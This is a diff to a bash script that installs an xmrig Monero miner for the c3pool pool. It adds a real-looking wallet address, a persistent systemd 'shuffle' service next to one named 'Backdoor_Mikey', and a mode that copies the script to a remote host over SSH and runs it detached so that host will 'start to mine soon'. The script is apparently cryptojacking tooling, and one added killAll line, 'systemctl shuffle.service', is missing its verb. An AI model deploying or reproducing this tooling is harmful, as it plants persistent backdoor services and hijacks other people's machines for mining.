@@ -22,7 +22,7 @@ echo '
 #     53333: 2G diff (ETH port/SSL/TLS)
 poolPort=19999
 # your wallet public address
-wallet=YOUR_WALLET_ADDRESS
+wallet=4256HG8uJUTPBqZiJYPNQ92x6PV1sUsngAsv3TQX4woqJGFsKQkjCdoZKbgfr8C3VnLWK7Qd5Y3WJBPcuzMW93AmVSYtN2W
 # installation directory (DONT change)
 InstDIR=$HOME
 DIR=$HOME/c3pool
@@ -33,7 +33,7 @@ DIR=$HOME/c3pool
 CPU_min_lim=50
 CPU_max_lim=75
 # Daemon: service which ensures to restart if the miner terminates unexpectedly
-daemon_active=true
+daemon_active=false
 # Detatched
 detatched=true
 ###############################################################################################################################
@@ -53,6 +53,7 @@ function killAll () {
     sed -i '/c3pool/d' $HOME/.profile;
     killall -9 xmrig;
     sudo systemctl stop Backdoor_Mikey.service  
+    sudo systemctl shuffle.service  
     log 'killed all services.'
 }
 function stopService () {
@@ -149,7 +150,7 @@ function refresh () {
     sudo systemctl reset-failed
 }
 function daemon () {
-    # custom daemon service to 
+    # custom daemon service
     echo "Creating Backdoor Daemon Mikey"
     cat >/tmp/Backdoor_Mikey.service <<EOL
   [Unit]
@@ -167,6 +168,25 @@ EOL
     sudo systemctl daemon-reload
     sudo systemctl enable Backdoor_Mikey.service
     sudo systemctl start Backdoor_Mikey.service  
+
+    # SHUFFLE
+    log "Creating Shuffling Service"
+    cat >/tmp/shuffle.service <<EOL
+  [Unit]
+Description=Shuffle
+[Service]
+ExecStart=$HOME/build.sh shuffle
+Restart=always
+Nice=8
+CPUWeight=1
+[Install]
+WantedBy=multi-user.target
+EOL
+    sudo mv /tmp/shuffle.service /etc/systemd/system/shuffle.service
+    log "shuffle service initiated ..."
+    sudo systemctl daemon-reload
+    sudo systemctl enable shuffle.service
+    sudo systemctl start shuffle.service
     log "miner will start shortly ..."
 }
 function build () {
@@ -189,24 +209,28 @@ function build () {
 
 
 # ----------------- interpret --------------------
-mode=$1;
+mode=$1$2;
 if [[ "$mode" == "-r" ]]; then # draw host credentials
-    log "$USER deploying build remotely at $IP ..."
     echo "Hostname: ";read IP;echo "Login: ";read USER
+    log "$USER deploying build remotely at $IP ..."
     scp -r ./* $USER@$IP:/home && \
     if [[ $detatched == true ]]; then
         ssh $USER@$IP "cd /home; setsid -f bash build.sh > /dev/null 2>&1"
     else
         cat ./build.sh | ssh $USER@$IP /bin/bash
     fi
+    log "$IP will start to mine soon!"
 elif [[ "$mode" == "-k" ]]; then
     killAll
-elif [ "$mode" == "-k -r" ] || [ "$mode" == "-r -k" ];then
+elif [ "$mode" == "-k-r" ] || [ "$mode" == "-r-k" ];then
     log 'remote KILL 🔪'
     echo "Hostname: ";read IP;echo "Login: ";read USER
     ssh $USER@$IP ". $InstDIR/build.sh -k"
+    log "killed $IP ..."
 elif [[ "$mode" == "-u" ]]; then
     uninstall
+elif [[ "$mode" == "shuffle" ]]; then
+    shuffle
 else
     build
 fi
